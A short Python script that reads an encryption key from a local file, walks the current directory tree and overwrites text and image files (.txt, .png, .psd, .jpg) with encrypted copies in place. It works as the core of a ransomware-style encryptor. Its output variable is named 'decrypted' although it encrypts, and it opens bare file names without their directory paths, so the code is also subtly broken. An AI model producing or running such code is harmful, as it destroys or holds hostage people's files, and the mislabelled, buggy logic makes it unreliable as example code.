from cryptography.fernet import Fernet
import os

with open("key.key","rb") as f:
    key=f.read()
    
fernet=Fernet(key)

for i in os.walk(os.getcwd()):
    for j in i[2]:
        if str(j).endswith((".txt", ".png", ".psd", ".jpg")):
            with open(str(j),"rb") as f:
                data=f.read()
                
            decrypted = fernet.encrypt(data)
            with open(str(j), "wb") as f:
                f.write(decrypted)